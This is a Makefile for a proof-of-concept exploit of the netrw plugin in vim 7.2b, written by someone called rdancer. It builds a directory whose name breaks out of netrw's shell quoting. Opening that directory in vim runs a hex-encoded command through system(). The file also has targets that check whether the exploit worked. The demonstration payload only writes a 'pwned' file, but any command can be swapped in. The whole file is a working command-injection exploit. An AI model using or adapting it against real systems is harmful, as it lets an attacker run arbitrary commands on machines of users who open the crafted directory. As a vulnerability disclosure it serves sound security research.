# Makefile for rdancer's exploit of the vim 7.2b netrw version 127

#
# Usage {{{1
#
# Some interesting targets:
#
#	(1) make sploit
#
#	    Compiles the exploit.
#
#	(2) make demo
#
#	    This is the default target.  Runs ``make sploit'', adds contents to
#	    the exploit tarball, and opens it in vim (thereby running the
#	    exploit)
#
#	(3) make test
#	
#	    Compile and run exploit non-interactively.

#
# Variables {{{1
#

# The name of the compiled exploit.  The single quotes are there to finish and
# restart the quoting in the script we're exploiting.  INITIAL and FINAL are
# variable within limits
INITIAL = "foo"
FINAL = "bar"
PAYLOAD = 'date >> pwned'
PAYLOAD_ENCODED = 0:$(shell printf '%s' $(PAYLOAD) | xxd -g256 -c256 | cut -d' ' -f2 )
EXPLOIT_NAME = "sploit/$(INITIAL)\")|call system(\"eval eval \`echo $(PAYLOAD_ENCODED) | xxd -r\`"

# Name of the file that will contain the netrw.vim version string
PLUGIN_VERSION = netrw_version

# Be very verbose -- use for debugging
#VIM_OPTIONS := -V16

# This is the name of the file created by the exploit
PWN_FILE = "pwned"

#
# Targets {{{1
#

# demo -- Open the exploit directory in vim, and report success upon exit {{{2
.PHONY: demo
demo: sploit
	rm -f $(PWN_FILE)
	vim $(VIM_OPTIONS) -- $(EXPLOIT_NAME)
	if test -f $(PWN_FILE); then \
		echo "Exploit worked: we're pwned (`wc -l < $(PWN_FILE)`x)"; \
	else \
		echo "Exploit didn't work."; \
	fi

# test -- Run the exploit in vim, non-interactively {{{2
.PHONY: test
test: VIM_OPTIONS := ${VIM_OPTIONS} +:q
test: demo

# sploit -- Compile the exploit {{{2
.PHONY: sploit
sploit: clean
	mkdir -p sploit
	mkdir $(EXPLOIT_NAME)
	# Create a symlink
	ln -s -- $(EXPLOIT_NAME) exploit

# clean -- Remove files we can make {{{2
.PHONY: clean
clean:
	rm -rf -- sploit
	rm -f  -- $(PWN_FILE)
	rm -f  -- exploit
	rm -f  -- tiocsti
	rm -f  -- $(PLUGIN_VERSION)

# test_payload -- Print both the encoded and decoded payload {{{2
.PHONY: test_payload
test_payload:
	echo $(PAYLOAD_ENCODED)
	echo $(PAYLOAD_ENCODED) | xxd -r | cat -A


# XXX NOTE: Sometimes hangs when run from within Vim
# plugin_version -- Store the plugin version string in the $(PLUGIN_VERSION) file {{{2
# Note: Has to be .PHONY, because the Vim version can change in-between runs
.PHONY: plugin_version
plugin_version:
	# Ex not exit cleanly, hence the ||:
	# -- and because of that, we won't know if it really succeeded, so we remove the file first
	rm -f -- $(PLUGIN_VERSION)
	ex . +:'call system ("printf %s\\\\n ". shellescape(g:loaded_netrw,0) ." > $(PLUGIN_VERSION)")' \
			+:q >/dev/null 2>&1 ||:

# plugin_version_print -- Print plugin version string {{{2
.PHONY: plugin_version_print
plugin_version_print: plugin_version
	cat $(PLUGIN_VERSION)


#
# Modeline {{{1
#
# vim: foldmethod=marker :
